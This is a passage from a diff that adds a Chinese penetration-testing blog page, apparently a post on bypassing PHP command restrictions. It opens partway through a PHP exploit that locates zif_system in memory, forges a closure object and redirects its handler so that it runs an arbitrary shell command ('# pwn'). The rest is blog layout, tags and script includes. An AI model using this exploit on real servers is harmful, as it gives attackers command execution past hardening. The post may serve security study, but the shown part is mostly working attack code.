class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment"># fake closure object</span><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>       <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br>    <span class="hljs-comment"># pwn</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <span class="hljs-comment"># internal func type</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <span class="hljs-comment"># internal func handler</span><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/PHP/">PHP</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+                    
+                      <a class="hover-with-bg" href="/tags/linux/">linux</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/08/02/%E6%BB%91%E5%9D%97%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%AF%B9%E6%8A%97&amp;somd5%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">滑块验证码的对抗-somd5批量查询</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/31/%E6%B5%85%E8%B0%88PHP%E5%B0%8F%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87/">
+                        <span class="hidden-mobile">PHP小马免杀的浅谈[过最新D盾]</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'oagiblog/oagiblog.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
